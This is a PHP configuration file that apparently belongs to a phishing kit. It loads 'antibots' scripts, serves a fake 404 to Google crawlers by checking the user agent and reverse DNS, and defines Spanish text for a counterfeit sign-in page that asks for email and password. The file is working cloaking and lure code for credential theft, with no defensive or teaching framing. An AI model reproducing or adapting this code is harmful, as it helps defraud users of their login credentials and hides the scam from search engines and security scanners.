<?php
include "../bots/antibots1.php";
include "../bots/antibots2.php";
include "../bots/antibots3.php";
include "../bots/antibots4.php";

if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }

// connexion
$ERROR="Algunos de sus datos no son correctos. Inténtelo de nuevo.";
$Email= "Correo electrónico";
$Password = "Contraseña";
$dok = "Iniciar sesión";
$req1 = "El correo electrónico es obligatorio.";
$req2 = 'La contraseña es obligatoria.';
$forgot ="¿Tiene problemas para iniciar sesión?";
$sign = "Crear cuenta";
$checking = "Verificando la información…";
$priva = "Privacidad";
$ri8 = "Todos los derechos reservados";
$legal = "";
// fin connexioon
?>